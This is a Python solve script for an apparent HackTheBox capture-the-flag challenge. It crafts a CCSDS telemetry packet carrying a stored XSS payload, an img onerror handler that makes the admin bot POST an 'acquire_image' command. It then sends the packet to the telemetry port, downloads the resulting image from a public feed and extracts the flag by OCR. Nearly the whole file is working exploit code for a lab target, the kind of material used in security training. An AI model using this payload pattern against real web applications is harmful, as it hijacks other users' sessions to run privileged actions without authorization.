#!/usr/bin/env python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#           PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF SPACE CRAFT
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

"""
HackTheBox - Groundstation_Breach - full solve

Chain:
  1. Craft a "valid" CCSDS telemetry packet whose ASCII payload is an XSS tag.
  2. Push it to the telemetry TCP port. The admin bot's browser renders the
     packet's text as HTML (innerHTML sink) and the onerror handler fires,
     which calls /api/command { command: "acquire_image" } as the logged-in
     admin.
  3. acquire_image stamps the flag onto a PNG that is stored in the PUBLIC
     /api/telemetry feed.
  4. Download the image, OCR the flag with tesseract.

Usage:
  python3 solve.py [WEB_HOST] [WEB_PORT] [TM_HOST] [TM_PORT]
"""

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import urllib.request
import subprocess
import base64
import socket
import time
import json
import sys
import io
import re

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Define application variables
# Modified: N/A
# -------------------------------------------------------------------------------------

WEB_HOST = sys.argv[1]
WEB_PORT = int(sys.argv[2])
TM_HOST = sys.argv[3]
TM_PORT = int(sys.argv[4])

XSS = b"<img src=x onerror=\"fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'acquire_image'})})\">"

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Create functional subroutines called from main.
# Modified: N/A
# -------------------------------------------------------------------------------------

def build_ccsds_packet(payload: bytes) -> bytes:
    apid = 1
    seq_count = 0
    pkt_len = len(payload) - 1
    header = bytes([(0 << 5) | (0 << 4) | (0 << 3) | ((apid >> 8) & 0x07),apid & 0xFF,(0b11 << 6) | ((seq_count >> 8) & 0x3F),seq_count & 0xFF,(pkt_len >> 8) & 0xFF,pkt_len & 0xFF,])
    return header + payload

def main() -> None:
    packet = build_ccsds_packet(XSS)
    print(f"[*] Sending {len(packet)}-byte packet to {TM_HOST}:{TM_PORT}")
    with socket.create_connection((TM_HOST, TM_PORT), timeout=10) as s:
        s.sendall(packet)
    print("[*] Waiting for admin bot to render packet and trigger acquire_image ...")
    for _ in range(15):
        time.sleep(2)
        with urllib.request.urlopen(f"http://{WEB_HOST}:{WEB_PORT}/api/telemetry", timeout=10) as resp:
            d = json.load(resp)
        if d.get("images"):
            img = d["images"][-1]
            print("[+] acquire_image triggered:", d["command_log"][-1])
            raw = base64.b64decode(img["data"])
            with open("flag_image.png", "wb") as f:
                f.write(raw)
            print(f"[+] Saved flag_image.png ({len(raw)} bytes)")
            break
    else:
        print("[-] No image appeared; bot may not be online yet - retry.")
        return
    try:
        from PIL import Image
        im = Image.open(io.BytesIO(raw)).convert("RGB")
        w, h = im.size
        im.crop((0, h - 90, w, h)).resize((w * 3, 270)).save("/tmp/_flag_crop.png")
    except Exception:
        pass
    print("[+] Enlarging image.")
    subprocess.run(["magick", "flag_image.png", "-filter", "Lanczos","-resize", "400%", "enlarged.png"],check=True)
    result = subprocess.run(["tesseract", "enlarged.png", "stdout", "--psm", "6"],capture_output=True,text=True,check=True)
    match = re.search(r"HTB\{[^}]+\}", result.stdout)
    if match:
        print("[!] FLAG = " + match.group(0))
    else:
        print("[-] No HTB flag found")

if __name__ == "__main__":
    main()
